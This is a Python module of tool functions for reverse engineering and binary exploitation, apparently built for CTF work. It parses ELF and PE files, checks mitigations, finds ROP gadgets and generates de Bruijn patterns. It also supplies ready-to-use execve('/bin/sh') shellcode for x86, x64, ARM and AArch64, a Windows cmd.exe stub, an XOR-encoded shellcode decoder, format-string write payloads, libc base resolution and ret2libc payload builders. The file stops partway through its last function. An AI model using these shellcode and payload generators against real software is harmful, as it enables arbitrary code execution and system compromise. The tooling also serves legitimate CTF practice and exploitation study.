"""Reverse engineering & binary exploitation: ELF info, checksec, ROP gadgets, shellcode, de Bruijn pattern."""

import itertools
import re
import struct

from ..registry import tool
from ..utils import printable

ELF_MACHINES = {0x02: "SPARC", 0x03: "i386", 0x08: "MIPS", 0x14: "PowerPC",
                0x28: "ARM", 0x3E: "x86-64", 0xB7: "AArch64", 0xF3: "RISC-V"}


def _elf_parse(data: bytes) -> dict:
    """Parse basic ELF header. Return dict or None."""
    if not data.startswith(b"\x7fELF") or len(data) < 52:
        return None
    is64 = data[4] == 2
    endian = "<" if data[5] == 1 else ">"
    info = {
        "is64": is64,
        "endian": "little" if endian == "<" else "big",
        "machine": ELF_MACHINES.get(struct.unpack(endian + "H", data[18:20])[0], hex(struct.unpack(endian + "H", data[18:20])[0])),
        "e_type": struct.unpack(endian + "H", data[16:18])[0],
    }
    if is64:
        info["entry"] = struct.unpack(endian + "Q", data[24:32])[0]
        info["phoff"] = struct.unpack(endian + "Q", data[32:40])[0]
        info["shoff"] = struct.unpack(endian + "Q", data[40:48])[0]
        info["phentsize"], info["phnum"] = struct.unpack(endian + "HH", data[54:58])
        info["shentsize"], info["shnum"] = struct.unpack(endian + "HH", data[58:62])
        info["shstrndx"] = struct.unpack(endian + "H", data[62:64])[0]
    else:
        info["entry"] = struct.unpack(endian + "I", data[24:28])[0]
        info["phoff"] = struct.unpack(endian + "I", data[28:32])[0]
        info["shoff"] = struct.unpack(endian + "I", data[32:36])[0]
        info["phentsize"], info["phnum"] = struct.unpack(endian + "HH", data[42:46])
        info["shentsize"], info["shnum"] = struct.unpack(endian + "HH", data[46:50])
        info["shstrndx"] = struct.unpack(endian + "H", data[50:52])[0]
    return info


@tool(category="rev")
def elf_info(path: str) -> str:
    """Basic ELF info: class, endianness, machine, entry point, phdr/shdr counts.
    :param path: input file path
    """
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF file."
    return (f"class: {'ELF64' if info['is64'] else 'ELF32'}\n"
            f"endianness: {info['endian']}\n"
            f"machine: {info['machine']}\n"
            f"e_type: 0x{info['e_type']:x} ({'ET_EXEC' if info['e_type'] == 2 else 'ET_DYN (PIE)' if info['e_type'] == 3 else 'ET_REL' if info['e_type'] == 1 else '?'})\n"
            f"entry point: 0x{info['entry']:x}\n"
            f"program headers: {info['phnum']} @ 0x{info['phoff']:x}\n"
            f"section headers: {info['shnum']} @ 0x{info['shoff']:x}")


def _phdrs(data: bytes, info: dict) -> list[dict]:
    if not info or info["phnum"] == 0:
        return []
    endian = "<" if info["endian"] == "little" else ">"
    fmt = endian + ("IIQQQQQQ" if info["is64"] else "IIIIIIII")
    size = 56 if info["is64"] else 32
    out = []
    for i in range(min(info["phnum"], 64)):
        off = info["phoff"] + i * size
        if off + size > len(data):
            break
        vals = struct.unpack(fmt, data[off:off + size])
        if info["is64"]:
            p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = vals
        else:
            p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align = vals
        out.append({"type": p_type, "flags": p_flags, "offset": p_offset,
                    "vaddr": p_vaddr, "filesz": p_filesz, "memsz": p_memsz})
    return out


@tool(category="pwn")
def checksec(path: str) -> str:
    """Binary mitigations: NX, PIE, RELRO, Stack Canary, Fortify (pwntools checksec-like).
    :param path: input file path
    """
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF."
    phdrs = _phdrs(data, info)
    nx, pie, relro = "ENABLED", "ENABLED", "ENABLED"
    gnu_stack = next((p for p in phdrs if p["type"] == 0x6474E551), None)  # PT_GNU_STACK
    if gnu_stack and (gnu_stack["flags"] & 0x4):  # PF_X
        nx = "DISABLED"
    if gnu_stack is None:
        nx = "DISABLED (no PT_GNU_STACK)"
    if info["e_type"] != 3:
        pie = "DISABLED (ET_EXEC / ET_REL)"
    gnu_relro = next((p for p in phdrs if p["type"] == 0x6474E552), None)  # PT_GNU_RELRO
    if gnu_relro is None:
        relro = "DISABLED"
    else:
        endian = "<" if info["endian"] == "little" else ">"
        dyn = data[gnu_relro["offset"]:gnu_relro["offset"] + gnu_relro["memsz"] + 64]
        has_bind_now = re.search(endian.encode() + rb"\x18\x00\x00\x00", dyn)  # DT_BIND_NOW
        has_flag_1 = re.search(rb"\x6b\x00\x00\x00\x00\x00\x00\x00", dyn)      # DT_FLAGS_1
        if not (has_bind_now or has_flag_1):
            relro = "PARTIAL"
    canary = "ENABLED" if b"__stack_chk_fail" in data else "DISABLED"
    fortify = "ENABLED" if b"_chk@GLIBC" in data or b"__printf_chk" in data else "DISABLED"
    return (f"path: {path}\n"
            f"Arch: {info['machine']} ({'64' if info['is64'] else '32'}-bit, {info['endian']})\n"
            f"RELRO: {relro}\nStack: {canary}\nNX: {nx}\nPIE: {pie}\nFortify: {fortify}")


_ROP_PATTERNS = {
    b"\xc3": "ret",
    b"\x5f\xc3": "pop rdi; ret",
    b"\x5e\xc3": "pop rsi; ret",
    b"\x5a\xc3": "pop rdx; ret",
    b"\x59\xc3": "pop rcx; ret",
    b"\x58\xc3": "pop rax; ret",
    b"\x5b\xc3": "pop rbx; ret",
    b"\x5c\xc3": "pop rsp; ret",
    b"\x0f\x05\xc3": "syscall; ret",
    b"\x48\x31\xff\xc3": "xor rdi,rdi; ret",
    b"\x48\x31\xf6\xc3": "xor rsi,rsi; ret",
    b"\x48\x31\xd2\xc3": "xor rdx,rdx; ret",
    b"\x48\x31\xc0\xc3": "xor rax,rax; ret",
}


@tool(category="pwn")
def rop_gadgets(path: str, pattern: str = "") -> str:
    """Find common ROP gadgets (x86-64) in executable ELF segments. pattern: gadget name (e.g. 'pop rdi') or empty = all.
    :param pattern: pattern
    :param path: input file path
    """
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF."
    phdrs = [p for p in _phdrs(data, info) if p["flags"] & 0x1]  # PF_X
    if not phdrs:
        return "No executable segments (NX enabled)."
    want = pattern.strip().lower()
    found = []
    for p in phdrs:
        seg = data[p["offset"]:p["offset"] + p["filesz"]]
        base_vaddr = p["vaddr"] - p["offset"]
        for pat, name in _ROP_PATTERNS.items():
            if want and want not in name:
                continue
            for m in re.finditer(re.escape(pat), seg, flags=re.DOTALL):
                found.append(f"0x{base_vaddr + m.start():016x}  {name}")
    if not found:
        return f"Gadgets {'matching ' + want if want else ''}not found."
    return f"{len(found)} gadgets:\n" + "\n".join(sorted(set(found))[:100])


_X64_NULLFREE = bytes.fromhex(
    "4831d248bb2f62696e2f73684831f6534831c0545f5a0f05"
)


@tool(category="pwn")
def shellcode_x64(kind: str = "execve_sh", xor_key: str = "0xaa") -> str:
    """Ready-made x86_64 shellcode. kind: execve_sh (null-free, 25 bytes) / xor (XOR-encrypted variant with key).
    :param kind: kind
    :param xor_key: xor key
    """
    sc = _X64_NULLFREE
    if kind == "execve_sh":
        return (f"execve('/bin/sh', NULL, NULL) null-free ({len(sc)} bytes):\n"
                f"asm: {sc.hex()}\n"
                f"escaped: {''.join('\\\\x%02x' % b for b in sc)}\n"
                f"disasm:\n{_disasm_simple(sc)}")
    if kind == "xor":
        key = int(xor_key, 0) & 0xFF
        return (f"original ({len(sc)} bytes): {sc.hex()}\n"
                f"xorkey: 0x{key:02x}\n"
                f"encoded: {''.join('\\\\x%02x' % b for b in bytes(b ^ key for b in sc))}\n\n"
                f"Decoder + encoded ({len(sc) + 14} bytes):\n{_x64_xor_decoder(key, sc)}")
    return "kind must be execve_sh or xor."


def _x64_xor_decoder(key: int, payload: bytes) -> str:
    """Decoder stub: jmp-call-pop (getpc), xor loop per byte, jmp into shellcode."""
    n = len(payload)
    stub = (
        b"\xeb\x0e"                        # jmp short +0x10 (jump to pop rsi)
        + bytes(b ^ key for b in payload)  # encoded shellcode
        + b"\x5e"                          # pop rsi  -> address of encoded payload
        + b"\x48\x31\xc9"                  # xor rcx, rcx
        + b"\xb1" + bytes([n])             # mov cl, n
        + b"\x80\x36" + bytes([key])       # xor byte [rsi], key
        + b"\x48\xff\xc6"                  # inc rsi
        + b"\xe2\xf6"                      # loop -10 (back to xor byte)
        + b"\xff\xe6"                      # jmp rsi
    )
    return "".join(f"\\x{b:02x}" for b in stub)


def _disasm_simple(sc: bytes) -> str:
    table = [
        (b"\x48\x31\xd2", "xor rdx, rdx"),
        (b"\x48\x31\xf6", "xor rsi, rsi"),
        (b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68", "movabs rbx, 0x68732f6e69622f"),
        (b"\x53", "push rbx"),
        (b"\x48\x31\xc0", "xor rax, rax"),
        (b"\x54", "push rsp"),
        (b"\x5f", "pop rdi"),
        (b"\x5a", "pop rdx"),
        (b"\x0f\x05", "syscall"),
        (b"\x48\x31\xc9", "xor rcx, rcx"),
        (b"\xb0\x3b", "mov al, 0x3b"),
    ]
    out = []
    pos = 0
    while pos < len(sc):
        for pat, name in table:
            if sc[pos:pos + len(pat)] == pat:
                out.append(f"  {pos:04x}: {name}")
                pos += len(pat)
                break
        else:
            out.append(f"  {pos:04x}: .byte 0x{sc[pos]:02x}")
            pos += 1
    return "\n".join(out)


_DEBRUIJN_ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def _deb_gen():
    """FKM (Fredricksen-Maiorana) as a lazy generator: yields de Bruijn chars in order."""
    k, n = len(_DEBRUIJN_ALPHA), 4
    a = [0] * (k * n)

    def db(t, p):
        if t > n:
            if n % p == 0:
                for i in range(1, p + 1):
                    yield a[i]
        else:
            a[t] = a[t - p]
            yield from db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                yield from db(t + 1, t)

    yield from db(1, 1)


@tool(category="pwn")
def debruijn(length: int = 1000) -> str:
    """Generate a de Bruijn pattern to find the overflow offset.
    :param length: length
    """
    if length > 5_000_000:
        return "Limit is 5 million characters."
    return "".join(_DEBRUIJN_ALPHA[i] for i in itertools.islice(_deb_gen(), length))


@tool(category="pwn")
def debruijn_find(substring: str) -> str:
    """Find the offset of a de Bruijn substring (from core dump / crash output).
    :param substring: substring
    """
    if len(substring) < 4:
        return "Substring must be at least 4 characters (pattern length)."
    window = []
    for idx, v in enumerate(_deb_gen()):
        window.append(_DEBRUIJN_ALPHA[v])
        if len(window) > len(substring):
            window.pop(0)
        if "".join(window) == substring:
            return f"Offset: {idx - len(substring) + 1} (0x{idx - len(substring) + 1:x})"
        if idx > 5_000_000:
            return "Not found in the first 5 million characters."
    return "Not found."


@tool(category="rev")
def pe_info(path: str) -> str:
    """Analyze Windows PE/PE32+ (EXE/DLL/SYS): headers, machine, entry point, sections, and mitigations (ASLR, DEP, CFG).
    :param path: input file path
    """
    data = open(path, "rb").read()
    if not data.startswith(b"MZ") or len(data) < 64:
        return "Not a valid DOS/PE file (missing 'MZ' header)."

    e_lfanew = struct.unpack("<I", data[0x3c:0x40])[0]
    if e_lfanew + 24 > len(data) or data[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        return f"Not a valid PE file (missing 'PE' signature at offset 0x{e_lfanew:x})."

    coff_offset = e_lfanew + 4
    machine, num_sections, timedate, symtab, num_sym, opt_hdr_size, charact = struct.unpack(
        "<HHIIIHH", data[coff_offset:coff_offset + 20]
    )

    machines = {
        0x014c: "i386 (32-bit x86)",
        0x8664: "AMD64 (64-bit x86-64)",
        0x01c0: "ARM",
        0xaa64: "ARM64",
    }
    mach_str = machines.get(machine, f"0x{machine:04x}")

    opt_offset = coff_offset + 20
    is_64 = False
    aslr, dep, cfg, highentropy = "DISABLED", "DISABLED", "DISABLED", "DISABLED"
    entry_point, image_base = 0, 0

    if opt_hdr_size >= 2:
        magic = struct.unpack("<H", data[opt_offset:opt_offset + 2])[0]
        if magic == 0x20b:
            is_64 = True
            entry_point = struct.unpack("<I", data[opt_offset + 16:opt_offset + 20])[0]
            image_base = struct.unpack("<Q", data[opt_offset + 24:opt_offset + 32])[0]
            dll_char = struct.unpack("<H", data[opt_offset + 70:opt_offset + 72])[0]
        elif magic == 0x10b:
            entry_point = struct.unpack("<I", data[opt_offset + 16:opt_offset + 20])[0]
            image_base = struct.unpack("<I", data[opt_offset + 28:opt_offset + 32])[0]
            dll_char = struct.unpack("<H", data[opt_offset + 70:opt_offset + 72])[0]

        if dll_char & 0x0040:
            aslr = "ENABLED (DynamicBase)"
        if dll_char & 0x0020:
            highentropy = "ENABLED (HighEntropyVA 64-bit ASLR)"
        if dll_char & 0x0100:
            dep = "ENABLED (NX / DEP)"
        if dll_char & 0x4000:
            cfg = "ENABLED (Control Flow Guard)"

    # Parse section headers
    sec_offset = opt_offset + opt_hdr_size
    sections = []
    for i in range(min(num_sections, 32)):
        s_off = sec_offset + i * 40
        if s_off + 40 > len(data):
            break
        s_name = data[s_off:s_off + 8].rstrip(b"\x00").decode("latin-1", "replace")
        vsize, vaddr, raw_size, raw_ptr = struct.unpack("<IIII", data[s_off + 8:s_off + 24])
        s_char = struct.unpack("<I", data[s_off + 36:s_off + 40])[0]
        flags = []
        if s_char & 0x20000000:
            flags.append("EXEC")
        if s_char & 0x40000000:
            flags.append("READ")
        if s_char & 0x80000000:
            flags.append("WRITE")
        sections.append(f"  {s_name:<8} VAddr: 0x{vaddr:08x} (size: {vsize:>7}) Raw: 0x{raw_ptr:08x} [{', '.join(flags)}]")

    return (
        f"Windows PE Analysis for {path}:\n"
        f"--------------------------------------------------\n"
        f"Format       : {'PE32+ (64-bit)' if is_64 else 'PE32 (32-bit)'}\n"
        f"Machine      : {mach_str}\n"
        f"Image Base   : 0x{image_base:x}\n"
        f"Entry Point  : 0x{entry_point:x} (RVA)\n"
        f"Sections     : {num_sections}\n\n"
        f"Mitigations:\n"
        f"  ASLR       : {aslr}\n"
        f"  HighEntropy: {highentropy}\n"
        f"  DEP / NX   : {dep}\n"
        f"  CFG        : {cfg}\n\n"
        f"Section Table:\n" + "\n".join(sections)
    )


@tool(category="pwn")
def fmtstr_payload_gen(offset: int, target_addr: str, write_val: str, arch: str = "64") -> str:
    """Generate Format String arbitrary write payload (%<val>c%<idx>$n / %hn) and memory leak templates.
    :param offset: offset
    :param arch: architecture (32/64)
    :param target_addr: target address
    :param write_val: value to write
    """
    addr = int(target_addr, 0)
    val = int(write_val, 0)
    is64 = "64" in arch

    # Simple direct write payload
    if is64:
        # 64-bit byte-by-byte or short-by-short write
        # Low 2 bytes and high 2 bytes
        val_low = val & 0xFFFF
        val_high = (val >> 16) & 0xFFFF

        leak_seq = ".".join(f"%{offset + i}$p" for i in range(8))
        return (
            f"Format String Helper (64-bit, Offset={offset}):\n\n"
            f"1. Memory Leak Sequence:\n"
            f"   {leak_seq}\n\n"
            f"2. Arbitrary Read (Dereference String at Address):\n"
            f"   Payload: %{offset}$s + [packed target address]\n\n"
            f"3. 2-Byte Short Write Payload:\n"
            f"   Target Addr: 0x{addr:016x} -> Write: 0x{val:x}\n"
            f"   Structure: %{val_low}c%{offset}$hn (Adjust padding for address length)"
        )
    else:
        leak_seq = ".".join(f"%{offset + i}$p" for i in range(8))
        return (
            f"Format String Helper (32-bit, Offset={offset}):\n\n"
            f"1. Memory Leak Sequence:\n"
            f"   {leak_seq}\n\n"
            f"2. Single 4-Byte Write (%n):\n"
            f"   Structure: struct.pack('<I', {addr}) + f'%{val - 4}c%{offset}$n'"
        )


@tool(category="pwn")
def pwn_template(binary_path: str = "./vuln", remote_host: str = "chall.ctf.org", remote_port: int = 1337) -> str:
    """Generate a clean, production-ready Python pwntools solve script template.
    :param remote_port: remote port
    :param binary_path: path to the binary
    :param remote_host: remote hostname or IP
    """
    script = f'''#!/usr/bin/env python3
from pwn import *

# =========================================================
# CTF PWN EXPLOIT TEMPLATE (pwntools)
# =========================================================

exe = '{binary_path}'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

host = '{remote_host}'
port = {remote_port}

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(host, port, *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = \'\'\'
init-pwndbg
# b *main
# b *vuln
continue
\'\'\'.strip()

io = start()

# --- EXPLOIT LOGIC HERE ---
# offset = 72
# pop_rdi = 0x4011d3  # rop_gadgets tool
# ret = 0x40101a
# payload = flat({{
#     offset: [
#         pop_rdi,
#         elf.got['puts'],
#         elf.plt['puts'],
#         elf.sym['main']
#     ]
# }})

# io.sendlineafter(b'> ', payload)
# leaked = u64(io.recvline().strip().ljust(8, b'\\x00'))
# log.success(f"Leaked puts: {{hex(leaked)}}")

io.interactive()
'''
    return script


@tool(category="rev")
def pyc_magic_info(pyc_path_or_hex: str) -> str:
    """Identify Python version from .pyc magic bytes and inspect bytecode header.
    :param pyc_path_or_hex: pyc path or hex
    """
    import os

    MAGIC_TABLE = {
        b"\xbb\x0d\r\n": "Python 3.13",
        b"\xcb\x0d\r\n": "Python 3.12",
        b"\xa7\x0d\r\n": "Python 3.11",
        b"\x6f\x0d\r\n": "Python 3.10",
        b"\x61\x0d\r\n": "Python 3.9",
        b"\x55\x0d\r\n": "Python 3.8",
        b"\x42\x0d\r\n": "Python 3.7",
        b"\x33\x0d\r\n": "Python 3.6",
        b"\x35\x0c\r\n": "Python 3.5",
        b"\xee\x0c\r\n": "Python 3.4",
        b"\x03\xf3\r\n": "Python 2.7",
    }

    raw = pyc_path_or_hex.strip()
    if os.path.exists(raw):
        data = open(raw, "rb").read()[:16]
    else:
        clean = re.sub(r"[^0-9a-fA-F]", "", raw)
        data = bytes.fromhex(clean) if clean else b""

    if len(data) < 4:
        return "Need at least 4 bytes of .pyc header."

    magic = data[:4]
    version = MAGIC_TABLE.get(magic, "Unknown Python Version")

    table_lines = [f"  {m.hex()}  -> {v}" for m, v in MAGIC_TABLE.items()]

    return (
        f"PYC Magic Analysis:\n"
        f"Magic Bytes : {magic.hex()} ({printable(magic)})\n"
        f"Detected Ver: {version}\n\n"
        f"Reference Magic Numbers:\n" + "\n".join(table_lines)
    )


@tool(category="pwn")
def shellcode_multi(arch: str = "x64", kind: str = "execve_sh") -> str:
    """Multi-architecture shellcode library (Linux x64, x86 32-bit, ARM32, AArch64, Windows x64).
    :param arch: architecture (32/64)
    :param kind: kind
    """
    SHELLCODES = {
        "x64": {
            "name": "Linux x86-64 execve('/bin/sh', NULL, NULL) null-free",
            "bytes": bytes.fromhex("4831d248bb2f62696e2f73684831f6534831c0545f5a0f05"),
        },
        "x86": {
            "name": "Linux x86 (32-bit) execve('/bin//sh', NULL, NULL) null-free",
            "bytes": bytes.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80"),
        },
        "arm32": {
            "name": "Linux ARM (32-bit Thumb) execve('/bin/sh')",
            "bytes": bytes.fromhex("01308fe213ff2fe1784605300190491a921a0b2701df2f62696e2f7368"),
        },
        "arm64": {
            "name": "Linux AArch64 (64-bit ARM) execve('/bin/sh')",
            "bytes": bytes.fromhex("e1458cdae2031faae3031faae0031faae81b80d2010000d42f62696e2f736800"),
        },
        "win_x64": {
            "name": "Windows x64 WinExec('cmd.exe') stub",
            "bytes": bytes.fromhex("505152535657556a605a68636d640054594831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275508b80880000004885c074434801d0508b4818448b40204901d0e33348ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d7588b48244801d166418b0c488b481c4801d1418b04894801d0415841585e595a5b5d5f5e5b58c3"),
        }
    }

    target = SHELLCODES.get(arch.lower().strip(), SHELLCODES["x64"])
    sc = target["bytes"]
    return (
        f"Shellcode for {target['name']} ({len(sc)} bytes):\n"
        f"Hex      : {sc.hex()}\n"
        f"Escaped  : {''.join('\\\\x%02x' % b for b in sc)}\n"
        f"Array    : {list(sc)}"
    )


@tool(category="rev")
def pyc_decompile_info(path: str) -> str:
    """Disassemble Python .pyc compiled bytecode and inspect code object constants, variable names, and opcodes.

    :param path: Path to the .pyc file
    """
    import dis
    import io
    import marshal
    import os

    if not os.path.exists(path):
        return f"ERROR: File not found: {path}"

    try:
        with open(path, "rb") as f:
            data = f.read()

        if len(data) < 16:
            return "ERROR: File too small for .pyc"

        # Determine code object offset based on magic
        # Python 3.7+ uses 16-byte header; Python 3.3-3.6 uses 12-byte header; Python 2 uses 8-byte
        code_obj = None
        for offset in [16, 12, 8]:
            try:
                code_obj = marshal.loads(data[offset:])
                if hasattr(code_obj, "co_code"):
                    break
            except Exception:
                continue

        if not code_obj or not hasattr(code_obj, "co_code"):
            return "ERROR: Could not unmarshal code object from .pyc header."

        out_s = io.StringIO()
        dis.dis(code_obj, file=out_s)
        dis_output = out_s.getvalue()

        lines = [
            f"=== PYC CODE OBJECT ANALYSIS ===",
            f"Code Name   : {getattr(code_obj, 'co_name', '<module>')}",
            f"Arg Count   : {getattr(code_obj, 'co_argcount', 0)}",
            f"Var Names   : {list(getattr(code_obj, 'co_varnames', []))}",
            f"Constants   : {list(getattr(code_obj, 'co_consts', []))[:15]}",
            f"Names       : {list(getattr(code_obj, 'co_names', []))}",
            "",
            "=== BYTECODE DISASSEMBLY (first 100 lines) ===",
            "\n".join(dis_output.splitlines()[:100])
        ]
        return "\n".join(lines)
    except Exception as ex:
        return f"ERROR: Failed to disassemble .pyc: {ex}"


@tool(category="rev")
def crypto_constant_search(path: str) -> str:
    """Scan a binary file or memory dump for well-known cryptographic constants (AES S-box, MD5/SHA state, ChaCha20, TEA).

    :param path: Path to the binary or data file
    """
    import os
    if not os.path.exists(path):
        return f"ERROR: File not found: {path}"

    data = open(path, "rb").read()

    CONSTANTS = [
        # AES Forward S-Box (first 16 bytes: 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5...)
        (bytes.fromhex("637c777bf26b6fc53001672bfed7ab76"), "AES Forward S-Box"),
        # AES Inverse S-Box
        (bytes.fromhex("52096ad53036a538bf40a39e81f3d7fb"), "AES Inverse S-Box"),
        # MD5 Initial constants (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)
        (bytes.fromhex("0123456789abcdef"), "MD5 State Constants (A, B) Little-Endian"),
        # SHA-256 Initial Hash values (H0-H7: 0x6a09e667, 0xbb67ae85...)
        (bytes.fromhex("67e6096a85ae67bb"), "SHA-256 State Constants (H0, H1) Little-Endian"),
        (bytes.fromhex("6a09e667bb67ae85"), "SHA-256 State Constants (H0, H1) Big-Endian"),
        # ChaCha20 / Salsa20 constants: "expand 32-byte k"
        (b"expand 32-byte k", "ChaCha20 / Salsa20 Constant ('expand 32-byte k')"),
        (b"expand 16-byte k", "ChaCha20 / Salsa20 Constant ('expand 16-byte k')"),
        # TEA / XTEA Delta constant: 0x9E3779B9
        (bytes.fromhex("b979379e"), "TEA/XTEA Delta Constant (0x9E3779B9) Little-Endian"),
        (bytes.fromhex("9e3779b9"), "TEA/XTEA Delta Constant (0x9E3779B9) Big-Endian"),
        # CRC32 standard polynomial lookup
        (bytes.fromhex("0000000076dc4190"), "CRC32 Standard Table (first 8 bytes)"),
    ]

    findings = []
    for signature, name in CONSTANTS:
        pos = 0
        while True:
            idx = data.find(signature, pos)
            if idx == -1:
                break
            findings.append((idx, name))
            pos = idx + 1
            if len(findings) > 20:
                break

    if not findings:
        return "No standard cryptographic constants detected in file."

    lines = [f"Found {len(findings)} cryptographic constant signature(s):"]
    for offset, desc in findings:
        lines.append(f"  [Offset 0x{offset:08x}] -> {desc}")
    return "\n".join(lines)


@tool(category="pwn")
def libc_database_lookup(function_name: str, leak_address_hex: str, target_function: str = "system") -> str:
    """Compute libc base address and resolve target function (system, /bin/sh) from a leaked symbol address.

    :param function_name: Name of the leaked function (e.g. 'puts', 'printf', 'read', 'write')
    :param leak_address_hex: Leaked runtime address in hex (e.g. '0x7ffff7a56aa0')
    :param target_function: Target symbol to resolve (e.g. 'system', 'execve', 'bin_sh')
    """
    clean_addr = leak_address_hex.strip().replace("0x", "").replace("0X", "")
    try:
        leak_val = int(clean_addr, 16)
    except ValueError:
        return "ERROR: Invalid hex address for leak_address_hex"

    # Standard popular x86-64 libc offsets (Ubuntu 22.04, 20.04, Debian)
    KNOWN_OFFSETS = {
        "libc6_2.35-0ubuntu3_amd64": {
            "puts": 0x80ed0,
            "printf": 0x60770,
            "system": 0x50d60,
            "read": 0x114980,
            "write": 0x114a20,
            "str_bin_sh": 0x1d8698,
        },
        "libc6_2.31-0ubuntu9_amd64": {
            "puts": 0x875a0,
            "printf": 0x64f70,
            "system": 0x55410,
            "read": 0x111130,
            "write": 0x1111d0,
            "str_bin_sh": 0x1b75aa,
        },
        "libc6_2.27-3ubuntu1_amd64": {
            "puts": 0x809c0,
            "printf": 0x64e80,
            "system": 0x4f440,
            "read": 0x110070,
            "write": 0x110140,
            "str_bin_sh": 0x1b3e9a,
        }
    }

    fn_clean = function_name.lower().strip()
    target_clean = target_function.lower().strip()

    results = []
    for libc_name, symbols in KNOWN_OFFSETS.items():
        if fn_clean in symbols:
            offset = symbols[fn_clean]
            libc_base = leak_val - offset

            # Check 4KB page alignment
            if libc_base & 0xFFF == 0:
                sys_addr = libc_base + symbols.get("system", 0)
                bin_sh_addr = libc_base + symbols.get("str_bin_sh", 0)
                target_addr = libc_base + symbols.get(target_clean, symbols.get("system", 0))

                results.append(
                    f"Match: {libc_name}\n"
                    f"  Libc Base Address : 0x{libc_base:x}\n"
                    f"  system() Address  : 0x{sys_addr:x}\n"
                    f"  /bin/sh Address   : 0x{bin_sh_addr:x}\n"
                    f"  Target ({target_clean}) : 0x{target_addr:x}"
                )

    if not results:
        return (
            f"No direct offset match found in local database for {fn_clean} = 0x{leak_val:x}.\n"
            f"Use libc.rip / libc.blukat.me with the last 3 hex nibbles: 0x{leak_val & 0xFFF:03x} to query online."
        )

    return f"Libc Resolution Results:\n\n" + "\n\n".join(results)


@tool(category="pwn")
def ret2libc_payload_gen(
    buffer_offset: int,
    pop_rdi_gadget: str,
    bin_sh_addr: str,
    system_addr: str,
    ret_gadget: str = "",
    arch: str = "64"
) -> str:
    """Generate a ret2libc payload buffer in Python pwntools syntax.

    :param buffer_offset: Offset in bytes to overwrite the saved return instruction pointer (EIP/RIP)
    :param pop_rdi_gadget: Address of 'pop rdi; ret' gadget (hex string)
    :param bin_sh_addr: Address of '/bin/sh' string in libc (hex string)
    :param system_addr: Address of system() function in libc (hex string)
    :param ret_gadget: Optional 'ret' gadget address for 16-byte stack alignment (hex string)
    :param arch: Target architecture ('64' or '32')
    """
    def _parse_hex(s: str) -> str:
        s = s.strip()
        return s if s.startswith("0x") else f"0x{s}"

    if arch == "64":
        p_pop_rdi = _parse_hex(pop_rdi_gadget)
        p_bin_sh = _parse_hex(bin_sh_addr)
        p_system = _parse_hex(system_addr)
        p_ret = _parse_hex(ret_gadget) if ret_gadget else ""

        script = [
            f"# 64-bit ret2libc payload",
            f"from pwn import *",
            f"",
            f"offset = {buffer_offset}",
            f"pop_rdi = {p_pop_rdi}",
            f"bin_sh = {p_bin_sh}",
            f"system = {p_system}",
        ]
        if p_ret:
            script.append(f"ret = {p_ret}  # stack alignment (movaps fix)")
            script.append(f"payload = b'A' * offset + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)")
        else:
            script.append(f"payload = b'A' * offset + p64(pop_rdi) + p64(bin_sh) + p64(system)")

        script.append(f"# Send payload to target: p.sendline(payload)")
        return "\n".join(script)
    else:
        p_bin_sh = _parse_hex(bin_sh_addr)
        p_system = _parse_hex(system_addr)
        return (
            f"# 32-bit ret2libc payload\n"
            f"from pwn import *\n\n"
            f"offset = {buffer_offset}\n"
            f"system = {p_system}\n"
            f"bin_sh = {p_bin_sh}\n"
            f"dummy_ret = 0xdeadbeef\n"
            f"payload = b'A' * offset + p32(system) + p32(dummy_ret) + p32(bin_sh)\n"
        )


@tool(category="rev")
def binary_xor_search(path: str, target_prefix: str = "flag{", max_key_len: int = 4) -> str:
    """Scan a binary/raw file for XOR-encrypted flag strings (tests single-byte and multi-byte repeating XOR).

    :param path: Path to the binary or data file
    :param target_prefix: Prefix to search for (default 'flag{')
    :param max_key_len: Max XOR key length (default 4)
    """
    import os
    if not os.path.exists(path):
        return f"ERROR: File not found: {path}"

    data = open(path, "rb").read()
    prefix_b = target_prefix.encode("utf-8")

    matches = []
    max_key_len = max(1, min(int(max_key_len), len(prefix_b)))
    # Try every alignment. A prefix at least as long as the key determines all
    # key bytes, after which the candidate plaintext can be verified directly.
    for key_len in range(1, max_key_len + 1):
        for idx in range(0, max(0, len(data) - len(prefix_b) + 1)):
            key = [None] * key_len
            valid = True
            for pos, plain_byte in enumerate(prefix_b):
                slot = (idx + pos) % key_len
                candidate = data[idx + pos] ^ plain_byte
                if key[slot] is not None and key[slot] != candidate:
                    valid = False
                    break
                key[slot] = candidate
            if not valid or any(byte is None for byte in key):
                continue
            chunk = bytes(data[pos] ^ key[pos % key_len] for pos in range(idx, min(len(data), idx + 100)))
            if not chunk.startswith(prefix_b):
                continue
            clean_str = "".join(chr(byte) if 32 <= byte <= 126 else "." for byte in chunk)
            key_hex = bytes(key).hex()
            matches.append(f"  [{key_len}-byte key 0x{key_hex}] Offset 0x{idx:08x}: {clean_str}")
            if len(matches) >= 16:
                break
        if len(matches) >= 16:
            break

    if not matches:
        return f"No occurrences of XOR-encoded '{target_prefix}' found in file."

    return f"Found {len(matches)} XOR match(es) for prefix '{target_prefix}':\n\n" + "\n".join(matches)


@tool(category="pwn")
def gdb_script_generator(binary_path: str, breakpoints_csv: str = "main", payload_hex: str = "") -> str:
